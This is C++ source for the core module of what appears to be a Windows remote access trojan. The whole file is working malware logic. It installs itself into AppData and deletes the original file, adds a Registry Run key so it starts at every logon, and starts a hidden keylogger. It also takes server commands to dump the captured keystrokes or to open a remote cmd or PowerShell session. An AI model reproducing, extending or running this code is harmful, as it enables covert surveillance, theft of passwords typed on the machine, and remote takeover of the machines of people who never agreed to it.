#include "general.h"
#include <process.h>

std::string General::currentPath;			//current path of executable
std::string General::installFolder;		//path of folder it should be installed to
std::string General::installPath;			//full path where executable should be installed to
bool General::installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,
									//instead of proceeding to the main loop)
LPTSTR General::lpArguments;


bool General::init()	//startup of program
{
	//VARIABLE SETUP
	currentPath = getCurrentPath();
	installFolder = getInstallFolder();
	installPath = getInstallPath(installFolder);



	if (!(lpArguments == NULL || (lpArguments[0] == 0)) && Settings::meltSelf)		//checks if arguments are supplied (path of old file) and then melts given file (if any)
	{
		remove(lpArguments);
	}

	if (Settings::installSelf)
	{
		if (!locationSet())				//checks if it is at it's destined location (config in settings.h)
		{
			setLocation();
			installing = true;
		}
	}

	if (Settings::setStartupSelf)			//checks if it should set itself into startup
	{
		if (!startupSet())				//checks if it's startup is set
		{
			setStartup(Conversion::convStringToWidestring(Settings::startupName).c_str(), Settings::installSelf ? Conversion::convStringToWidestring(installPath).c_str() : Conversion::convStringToWidestring(currentPath).c_str(), NULL);
		}
	}


	runInstalled();			//checks if this run of the instance is designated to the install process, then checks whether it should start the installed client

	if (Settings::logKeys)
	{
		std::thread Keylogger(Keylogger::startLogger);
		Keylogger.detach();
	}

	return installing;
}

bool General::regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName)
{
	DWORD dwType = 0;
	long lResult = 0;
	HKEY hKeyPlaceholder = NULL;

	lResult = RegOpenKeyEx(hKey, keyPath, NULL, KEY_READ, &hKeyPlaceholder);
	if (lResult == ERROR_SUCCESS)
	{
		lResult = RegQueryValueEx(hKeyPlaceholder, valueName, NULL, &dwType, NULL, NULL);

		if (lResult == ERROR_SUCCESS)
		{
			return true;
		}
		else
			return false;
	}
	else
		return false;
}

bool General::setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	bool fSuccess;			//TEMP CHANGE, OLD: BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}




bool General::directoryExists(const char* dirName)			//checks if directory exists
{
	DWORD attribs = ::GetFileAttributesA(dirName);
	if (attribs == INVALID_FILE_ATTRIBUTES)
		return false;
	return true;			//original code : return (attribs & FILE_ATTRIBUTE_DIRECTORY); [CHANGED BC WARNING]
}


std::string General::getInstallFolder()		//gets install folder (example: C:\users\USER\AppData\Roaming\InstallDIR)
{
	std::string rest = "";
	if (!(Settings::folderName == ""))
		rest = "\\" + Settings::folderName;

	std::string concat;
	char* buf = 0;
	size_t sz = 0;
	if (_dupenv_s(&buf, &sz, Settings::installLocation.c_str()) == 0) //gets environment variable
		if (buf != NULL)
		{

			concat = std::string(buf) + rest; //concatenates string
			free(buf);
		}
	return concat;
}

std::string General::getInstallPath(std::string instFolder)		//gets installpath (environment folder + folder name (if supplied) + file name)
{
	std::string concat;
	concat = instFolder + "\\" + Settings::fileName;

	return concat;
}

std::string General::getCurrentPath()		//gets current path of executable
{
	char buf[MAX_PATH];
	GetModuleFileName(0, buf, MAX_PATH);
	return std::string(buf);
}



bool General::locationSet()		//checks if executable is located in install position
{
	if (General::currentPath == General::installPath)
		return true;
	else
		return false;
}

bool General::startupSet()		//checks if executable is starting on boot
{
	if (General::regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings::startupName.c_str()))
		return true;
	else
		return false;
}


bool General::installed()		//checks if executable is installed properly (location + startup)
{
	if (startupSet() && locationSet())
		return true;
	else
		return false;
}


std::string General::currentDateTime()
{
	time_t     now = time(0);
	struct tm  tstruct;
	char       buf[80];
	localtime_s(&tstruct, &now);
	strftime(buf, sizeof(buf), "%d/%m/%Y [%X]", &tstruct);

	return buf;
}


void General::startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments)		//starts a process
{
	// additional information
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// set the size of the structures
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	// start the program up
	CreateProcess(lpApplicationName,   // the path
		lpArguments,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi);           // Pointer to PROCESS_INFORMATION structure
						// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void General::handleError(int errType, bool errSevere)	//handles errors
{
	if (errSevere)
	{
		restartSelf();
	}
	else
	{
		switch (errType)
		{
		case 1:		//general error
			Client::clientptr->SendString("General error", PacketType::Warning);
			return;
		case 2:		//cmd error		
			Client::clientptr->SendString("CMD error", PacketType::Warning);
			return;
		case 3:		//networking error
			Client::clientptr->SendString("Networking error", PacketType::Warning);
			return;
		}

	}

}

bool General::processParameter(std::string &command, std::string compCommand)
{
	std::string::size_type i = command.find(compCommand);
	if (i != std::string::npos)
	{
		command.erase(i, compCommand.length() + 1);
		return true;
	}
	else
		return false;
}

std::string General::processCommand(std::string command)
{
	if (command == "kill")
	{
		killSelf();
		return "killing self";
	}
	else if (command == "restart")
	{
		restartSelf();
		return "restarting";
	}

	else if (command == "keydump")
	{

		return Keylogger::dumpKeys();
	}

	else if (processParameter(command, "remoteControl"))
	{
		if (!CMD::cmdOpen)
		{
			if (command == "cmd")
				command = "C:\\WINDOWS\\system32\\cmd.exe";
			else if (command == "pws")
				command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
			else if (command == "pws32")
				command = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";

			if (Utility::fileExists(command))
			{
				char* buffer = new char[command.length() + 3];
				buffer[command.length()] = '\0';
				strcpy_s(buffer, command.length() + 2, command.c_str());

				_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CMD::cmdThread, (LPVOID)buffer, NULL, NULL);
				while (!CMD::cmdOpen)
				{
					Sleep(50);
				}
				delete[] buffer;
				return "CMD session opened.";
			}
			else
				return "File doesn't exist.";
		}
		else
		{
			CMD::cmdptr->writeCMD("exit");
			CMD::cmdOpen = false;
			return "CMD session closed";
		}
	}
	else
	{
		return "Command '" + command + "' was not recognized.";
	}
}

void General::restartSelf()
{
	Client::clientptr->SendString("Restart requested: Restarting self", PacketType::Warning);
	startProcess(currentPath.c_str(), NULL);
	exit(0);
}

void General::killSelf()
{
	Client::clientptr->SendString("Termination requested: Killing self", PacketType::Warning);
	Client::clientptr->CloseConnection();
	exit(0);
}

void General::log(std::string message)
{
	if (Settings::logEvents)
	{
		std::ofstream logFile;
		logFile.open(installFolder + "\\" + Settings::logFileName, std::ios_base::app);
		logFile << currentDateTime() << ": " << message << std::endl;
		logFile.close();
	}
}


void General::setLocation()			//sets location(copies file)
{
	if (!General::directoryExists(General::installFolder.c_str()))
		if (!CreateDirectory(General::installFolder.c_str(), NULL))	//tries to create folder		
		{
			//[MAYBE DO SOMETHING LATER IF IT FAILS - PERHAPS REROUTE INSTALL TO APPDATA]
		}
	CopyFile(General::currentPath.c_str(), General::installPath.c_str(), 0);
}


void General::runInstalled()		//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
{
	if (General::installing)
		if (!Settings::startOnNextBoot)
		{
			General::startProcess(General::installPath.c_str(), Settings::meltSelf ? Conversion::convStringToLPTSTR("t " + General::currentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
		}

}
